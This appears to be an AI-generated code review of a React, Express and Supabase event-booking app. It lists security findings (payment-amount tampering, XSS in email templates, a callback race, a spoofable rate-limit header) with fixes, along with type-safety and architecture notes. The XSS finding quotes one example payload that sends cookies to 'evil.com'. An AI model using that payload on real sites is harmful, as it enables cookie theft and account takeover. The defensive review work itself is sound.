# TwendeHub — Code Review

**Scope**: Full-stack analysis of the React 19 + Express.js + Supabase application.  
**Date**: June 2026  
**Reviewer**: Claude Code (automated deep review)

---

## Summary

TwendeHub is a well-structured application with a clear domain model, good use of Supabase RLS for data isolation, proper JWT verification, and thoughtful security headers. The major concerns are a critical **payment-amount fraud vector**, **XSS in email templates**, a **CSP that breaks in production**, and pervasive `as any` casts that remove TypeScript's ability to catch regressions. Fixing the top three issues should be done before the next production release; the rest are prioritised below.

---

## 1. Security & Authorization

### [CRITICAL] Participant fee accepted from client without server-side validation

**File**: `server.ts:228–241`

```ts
const amount =
  type === "participant"
    ? Number(req.body.amount ?? 0)   // ← taken from the request body
    : 1000;
```

The participant fee is read directly from the request body and only validated to be `> 0`. There is no check against the event's `participant_fee` column. An attacker can send `amount: 1` and pay 1 KES for any event, regardless of the real price. The event record is fetched (`events.id`, `events.status`) but `participant_fee` is never read.

**Fix**: extend the participant event query to include `participant_fee`:

```ts
const { data: event } = await supabase
  .from("events")
  .select("id, status, participant_fee")
  .eq("id", event_id)
  .eq("status", "active")
  .single();

if (type === "participant" && amount !== event.participant_fee) {
  return res.status(400).json({ error: "Payment amount does not match event fee" });
}
```

---

### [HIGH] XSS in email templates — user-controlled strings interpolated raw into HTML

**File**: `src/lib/email.ts` — every template function

User-supplied values (`eventTitle`, `organizerName`, `vehicleDesc`, `notes`, `reason`, `activityType`, `locationName`) are interpolated directly into HTML template strings with no escaping:

```ts
// line 262
${organizerName} has requested your vehicle <strong>${vehicleDesc}</strong> for
the event <strong>${eventTitle}</strong>.
// line 267
${notes ? `<p>Notes from organiser: ${notes}</p>` : ""}
// line 231
Reason: ${reason}
```

An organizer who sets their display name to `<img src=x onerror="fetch('https://evil.com?c='+document.cookie)">` injects that tag into every email sent to vehicle owners and photographers. The `notes` field (free-form text) is especially dangerous because it is rendered without any wrapping or indication that it is user-generated content.

**Fix**: install `he` (or `html-entities`) and escape every interpolated value:

```ts
import he from "he";
const e = (s: string | null | undefined) => he.escape(s ?? "");

// usage
${e(organizerName)} has requested your vehicle <strong>${e(vehicleDesc)}</strong>
```

Apply `e()` to all user-controlled interpolations: `eventTitle`, `organizerName`, `vehicleDesc`, `notes`, `reason`, `activityType`, `locationName`, `requestUrl`, `eventUrl`. Values from your own code (amounts, dates, IDs) do not need escaping.

---

### [MEDIUM] M-Pesa callback TOCTOU race condition

**File**: `server.ts:449–465`

The callback handler reads the payment's current status, decides whether to process it, then performs two separate DB operations (update status, apply effects). Two Safaricom callbacks arriving within the same network round-trip can both read `status = "pending"`, both pass the idempotency guard, and both call `applyApprovedPaymentEffects` — potentially confirming a participant twice or crediting an organizer twice.

```ts
// read
if (pay.payment_status === "confirmed" || ...) return; // guard passes for both

// first writer wins — second writer also proceeds
await supabase.from("payments").update({ payment_status: "confirmed" }).eq("id", pay.id);
await applyApprovedPaymentEffects(...);
```

**Fix**: make the idempotency check atomic using a conditional update:

```ts
const { data: updated } = await supabase
  .from("payments")
  .update({ payment_status: "confirmed", processed_at: new Date().toISOString(), ... })
  .eq("id", pay.id)
  .eq("payment_status", "pending")   // only update if still pending
  .select("id")
  .maybeSingle();

if (!updated) {
  return res.json({ ResultCode: 0, ResultDesc: "Already processed" });
}
// safe to call applyApprovedPaymentEffects now
```

---

### [MEDIUM] Defense-in-depth gap in `getMyBookings()`

**File**: `src/services/profile.ts:117–123`

```ts
const { data: vbRows } = await supabase
  .from("vehicle_bookings")
  .select("id, status, total_price, organizer_id, ...");  // no .eq() filter
```

Both booking queries rely entirely on Supabase RLS to scope results to the current user. The RLS policy on `vehicle_bookings` (`organizer_id = auth.uid() OR vehicle_owner = auth.uid()`) is correctly configured today, so there is no active data exposure. However, there is no DB-level filter in the query itself — if RLS is ever temporarily disabled for a migration, a bulk export, or debugging, this query returns all bookings in the system.

**Fix**: mirror the RLS intent in the query so the intent is explicit regardless of RLS state:

```ts
const { data: vbRows } = await supabase
  .from("vehicle_bookings")
  .select("id, status, total_price, organizer_id, ...")
  .or(`organizer_id.eq.${userId},vehicles.owner_id.eq.${userId}`);
```

---

### [LOW] Rate-limit IP header spoofable

**File**: `server.ts:157`

```ts
const ip = (req.headers['x-forwarded-for'] as string)?.split(',')[0]?.trim()
           || req.socket.remoteAddress || 'unknown';
```

`X-Forwarded-For` is a client-supplied header. An attacker can send `X-Forwarded-For: 1.2.3.4` with each request to cycle IPs and effectively bypass the 120-req/min rate limit.

**Fix**: configure Express to trust the proxy tier properly and only read the header when it originates from a trusted proxy:

```ts
// in startServer(), before adding middleware
app.set('trust proxy', 1);  // trust one hop (e.g., nginx / Fly.io / Railway)
// then use req.ip, which Express validates against trusted proxies
```

For Upstash Redis, the same `req.ip` (trusted) should be passed instead of re-reading the header.

---

### [LOW] CSP nonce generated but never injected into the SPA

**File**: `server.ts:127–140`

In production, each request generates a random nonce and sets it in the `Content-Security-Policy` header:

```ts
`script-src 'self' 'nonce-${nonce}'`
```

But the Vite-built `dist/index.html` contains `<script>` tags without any `nonce` attribute — there is no mechanism to inject the per-request nonce into the static HTML file. This means in production the browser will block the app's own scripts, since neither `'unsafe-inline'` nor a matching nonce is present on the script tags.

**Fix (option A — hash-based CSP)**: remove the nonce approach and compute the SHA-256 hash of each inline script in the build output, then use `'sha256-<hash>'` in the CSP. Vite's `vite-plugin-csp-hash` automates this.

**Fix (option B — inject at serve time)**: In the `app.get("*", ...)` SPA fallback, read `dist/index.html`, replace a placeholder (`__CSP_NONCE__`) with the per-request nonce, then send the modified HTML. This keeps the nonce approach but requires treating `index.html` as a template.

---

## 2. Correctness Bugs

### [HIGH] Main Supabase server client cast as `any`, losing all type-checking

**File**: `server.ts:29`

```ts
const supabase = supabaseServer as any;
```

Every one of the 50+ database calls in `server.ts` flows through this untyped reference. Wrong column names, missing required fields, and mismatched types in `.insert()` / `.update()` calls will compile silently and fail at runtime in production. The generated types in `src/lib/supabase.types.ts` exist precisely to prevent this.

**Fix**: remove the cast and type the client with the generated types:

```ts
import type { Database } from "./src/lib/supabase.types.js";
import type { SupabaseClient } from "@supabase/supabase-js";

const supabase: SupabaseClient<Database> = supabaseServer;
```

The same fix should be applied to `src/server/paymentService.ts:28` (`supabase: any` parameter) and `src/server/adminRoutes.ts:8` (`supabase: any` in the interface).

---

### [MEDIUM] In-memory rate-limit `Map` grows unbounded

**File**: `server.ts:146–176`

When Redis is not configured, the fallback `rateLimitStore` is a plain `Map<string, RateEntry>`. Entries are added for every unique IP but never evicted. On a long-running server exposed to the public internet, the Map accumulates indefinitely.

**Fix**: schedule a periodic sweep after the Map is created:

```ts
setInterval(() => {
  const now = Date.now();
  for (const [key, entry] of rateLimitStore) {
    if (entry.resetAt < now) rateLimitStore.delete(key);
  }
}, RATE_WINDOW_MS);
```

---

### [MEDIUM] Dev mock payment `setTimeout` does not survive a server restart

**File**: `server.ts:285–295`

```ts
setTimeout(async () => {
  await supabase.from("payments").update({ payment_status: "confirmed" });
  await applyApprovedPaymentEffects(...);
}, 3000);
```

If the server restarts within 3 seconds of a mock payment being initiated (common in development with hot-reload), the timer is lost. The payment record stays in `pending` status and the event never becomes `active`, leaving the developer confused.

**Fix**: on server startup, query for mock payments that are still `pending` and older than a few seconds and auto-confirm them:

```ts
// run once in startServer() after routes are registered
if (!config.isProd) {
  const cutoff = new Date(Date.now() - 5_000).toISOString();
  const { data: stuck } = await supabase
    .from("payments")
    .select("id, event_id, user_id, payment_type")
    .eq("payment_status", "pending")
    .like("transaction_reference", "MOCK-%")
    .lt("created_at", cutoff);
  for (const p of stuck ?? []) {
    await supabase.from("payments").update({ payment_status: "confirmed" }).eq("id", p.id);
    await applyApprovedPaymentEffects(supabase, p, finalizeParticipantBookingPayment);
  }
}
```

---

### [LOW] `joinEvent` accepts a `userId` parameter it never uses

**File**: `src/services/events.ts:183`

```ts
export async function joinEvent(eventId: number, _userId: string): Promise<void> {
```

The `_userId` parameter (underscore prefix = intentionally unused) is ignored. The underlying RPCs use `auth.uid()` from the Supabase session, so the function implicitly depends on the anon-key client being called with an active session. If this function were ever called from a server-side context without a user session, it would silently operate as the wrong user.

**Fix**: remove the dead parameter and document the session dependency in the function signature or a short comment, or refactor to accept and forward a JWT so the function is safe to call server-side.

---

## 3. Architecture & Design

### `server.ts` is a 934-line monolith

**File**: `server.ts:1–960`

The file currently owns: Express setup, CORS, security headers, rate limiting, health check, M-Pesa STK push, M-Pesa callback, payment status polling, manual payment verification, cancellation/refund eligibility checks, vehicle booking notifications, photographer booking notifications, and two activity-request notification endpoints — before delegating to `adminRoutes.ts` and `payoutRoutes.ts`.

The notification endpoints (lines 734–909) follow an identical pattern — fetch booking/request, look up email, send notification — and have nothing conceptually to do with payment processing. Extracting them reduces `server.ts` to ~550 lines and makes both halves easier to test in isolation.

**Fix**: create `src/server/notificationRoutes.ts` and move the four notify endpoints there, following the same module pattern already used by `adminRoutes.ts` and `payoutRoutes.ts`:

```ts
export function registerNotificationRoutes({ app, supabase, authenticateSupabase }: NotificationDeps) { ... }
```

---

### `listEvents()` makes two round-trips where one would do

**File**: `src/services/events.ts:64–73`

After fetching up to 13 events, a second Supabase query retrieves all reviews for those event IDs, then ratings are aggregated in JavaScript. This is a manual implementation of what PostgreSQL can do natively. The extra round-trip adds latency and the JavaScript aggregation runs in the browser or server instead of the database.

**Fix**: create a lightweight Supabase view or use a sub-select:

```sql
-- supabase/migrations/032_events_with_stats_view.sql
CREATE OR REPLACE VIEW v_events_with_stats AS
SELECT
  e.*,
  COALESCE(AVG(r.rating), NULL)::numeric(3,1) AS avg_rating,
  COUNT(r.id)::int AS review_count
FROM events e
LEFT JOIN reviews r ON r.event_id = e.id
GROUP BY e.id;
```

Then query `v_events_with_stats` in `listEvents()` to get both in one call.

---

### Fire-and-forget emails have no delivery visibility

**File**: `server.ts:467–535`

After a confirmed M-Pesa callback, booking confirmation and payment receipt emails are sent in async IIFEs that swallow all errors:

```ts
(async () => {
  try { await sendEmail(...); }
  catch (e) { console.error("Failed to send ...", e?.message); }
})();
```

If Resend is down or the user's email is invalid, the failure is logged to the server console only. Users never know their payment receipt wasn't delivered; admins have no visibility into email failures.

**Fix (minimal)**: log failures to an `email_failures` table with the recipient, template name, and error message so the admin dashboard can surface them. A full retry queue (Bull/BullMQ) is the long-term solution.

---

## 4. Type Safety

### Pervasive `as any` casts conceal type errors across services

| File | Lines |
|---|---|
| `server.ts` | 29, 59, 79, 351, 358, 439 |
| `src/server/paymentService.ts` | 28 |
| `src/server/adminRoutes.ts` | 8, 9, 68, 103, 237 |
| `src/services/events.ts` | 62, 84, 120, 168, 185, 194, 202, 208 |
| `src/services/profile.ts` | 25, 62, 84, 128, 144 |
| `src/pages/AdminDashboard.tsx` | 65, 78, 84, and many more |

The root cause in most places is that the auto-generated `supabase.types.ts` types don't perfectly match the shape returned by joined queries (e.g., `organizer:users!events_organizer_id_fkey(name)` returns an object, but the generated type says `unknown`). Rather than fixing the type at the source, each callsite adds `as any`, propagating type-unsafety downstream.

**Fix**:
1. Regenerate types from the live schema: `npx supabase gen types typescript --local > src/lib/supabase.types.ts`.
2. Where joined shapes still don't match, define narrow interface types at the call site and cast once (`data as { id: number; organizer: { name: string } | null }`) rather than casting to `any`.
3. Add an ESLint rule (`@typescript-eslint/no-explicit-any: "error"`) to prevent new `any` casts from being added without a suppression comment.

---

### `AuthedRequest` not enforced in route handler signatures

**File**: `server.ts:227, 566, 603, 630, 696, 718, 734, 772, ...`

The `authenticateSupabase` middleware populates `req.user`, but most route handlers are typed as `(req: any, res)`. This means accessing `req.user.id`, `req.user.role`, etc. never gets a null-safety check from the compiler — if the middleware were accidentally removed from a route, `req.user` would be `undefined` and the handler would throw an unhandled runtime error.

**Fix**: change handler signatures to use `(req: AuthedRequest, res: Response)` — the type is already defined in `src/server/types.ts`:

```ts
app.post("/api/payments/initiate", authenticateSupabase, async (req: AuthedRequest, res: Response) => {
  const userId = req.user.id;  // now type-safe and null-checked
```

---

## 5. Code Quality

### Structured logger exists but is not used on the server

**File**: `src/lib/logger.ts` exists; `server.ts` has 11 bare `console.log/error` calls

A `log({ level, message, context, error })` utility lives in `src/lib/logger.ts` and is already used in `src/lib/apiClient.ts`. The server uses raw `console.*` for all logging — payment failures, M-Pesa errors, server start, request logs — making it impossible to parse logs structurally in production or route errors to an observability platform (Datadog, Logtail, etc.).

**Fix**: import and use `log()` in `server.ts`, then add a production formatter in `logger.ts` that emits newline-delimited JSON when `NODE_ENV === "production"`.

---

### Commented-out debug statements in `Login.tsx`

**File**: `src/pages/Login.tsx:19–20, 24`

```ts
// Debug: log start of login flow
// console.log('[Login] submit start', { email });
...
// console.log('[Login] login succeeded, navigating');
```

**Fix**: delete both blocks. The comment `// Debug: log start of login flow` is also unnecessary noise.

---

### Email template boilerplate duplicated across every template function

**File**: `src/lib/email.ts` — all 8 template functions

Each function re-declares the full HTML shell (`<html><body>…<div card>…<header>…<footer>`). Any styling change (e.g., updating the brand colour) requires touching all 8 functions.

**Fix**: extract a layout helper:

```ts
function renderLayout(headerText: string, body: string): string {
  return `<html><body style="${baseStyles.body}">
    <div style="${baseStyles.card}">
      <div style="${baseStyles.header}">${he.escape(headerText)}</div>
      <div style="${baseStyles.content}">${body}</div>
    </div>
    <div style="${baseStyles.footer}">...</div>
  </body></html>`;
}
```

Each template then only provides the body content, and the HTML injection risk is contained to one place that is clearly the template system boundary.

---

### Lazy route `<Suspense>` fallback is unstyled bare text

**File**: `src/App.tsx:45`

```tsx
<Suspense fallback={<div className="pt-32 text-center">Loading...</div>}>
```

A `<PageLoader />` component already exists at `src/components/PageLoader.tsx` and renders a proper styled skeleton.

**Fix**:

```tsx
import PageLoader from './components/PageLoader';
// ...
<Suspense fallback={<PageLoader />}>
```

---

## Findings Index

| ID | Severity | Category | Short title |
|---|---|---|---|
| S1 | CRITICAL | Security | Participant fee not validated server-side |
| S2 | HIGH | Security | XSS in email templates |
| B1 | HIGH | Bug | `supabase` server client cast as `any` |
| S3 | MEDIUM | Security | TOCTOU in M-Pesa callback |
| S4 | MEDIUM | Security | `getMyBookings()` lacks DB-level filter (defense-in-depth) |
| B2 | MEDIUM | Bug | Rate-limit Map never evicted (memory leak) |
| B3 | MEDIUM | Bug | Dev mock payment lost on server restart |
| S5 | LOW | Security | Rate-limit IP header spoofable |
| S6 | LOW | Security | CSP nonce unused — production scripts will be blocked |
| B4 | LOW | Bug | `joinEvent` `_userId` parameter dead and misleading |
| A1 | — | Architecture | `server.ts` monolith — extract notification routes |
| A2 | — | Architecture | `listEvents()` double round-trip for reviews |
| A3 | — | Architecture | Fire-and-forget emails have no visibility |
| T1 | — | Types | Pervasive `as any` across services and pages |
| T2 | — | Types | Route handlers typed as `any` instead of `AuthedRequest` |
| Q1 | — | Quality | `log()` utility unused on server |
| Q2 | — | Quality | Commented-out debug statements in Login.tsx |
| Q3 | — | Quality | Email template boilerplate duplicated 8× |
| Q4 | — | Quality | Suspense fallback is bare text, not `<PageLoader />` |

---

## What's Working Well

- **Supabase RLS** is properly configured on all user-data tables. Row-level security enforces multi-tenancy at the database layer, not just application code.
- **JWT verification** in `authenticateSupabase` correctly verifies the Supabase-issued token against `SUPABASE_JWT_SECRET` before any DB call.
- **Webhook signature verification** on the M-Pesa STK callback (HMAC-SHA256 + `crypto.timingSafeEqual`) is correctly implemented and mandatory in production.
- **IP allowlist** for B2C callbacks (`requireSafaricomIpAllowlist`) adds a second layer of defence on the payout webhook.
- **Idempotency guard** on the callback (checking `payment_status` before processing) is the right pattern — it just needs to be made atomic (S3 above).
- **Rate limiting** with Upstash Redis for production and a correct fallback for development.
- **CSP and security headers** are all present; the nonce approach just needs wiring (S6 above).
- **Admin audit log** captures all sensitive admin actions with structured `details` JSONB.
- **Config validation at startup** throws early in production if required secrets are missing.
- **Graceful shutdown** (`SIGTERM`/`SIGINT` with a 10-second drain) is correctly implemented.
- **Auth token lifecycle** — Supabase SDK manages session persistence and refresh; the app correctly derives the token from the session rather than storing it separately.
- **`apiClient.ts`** — well-structured retry logic, proper error wrapping, and integration with the logger.
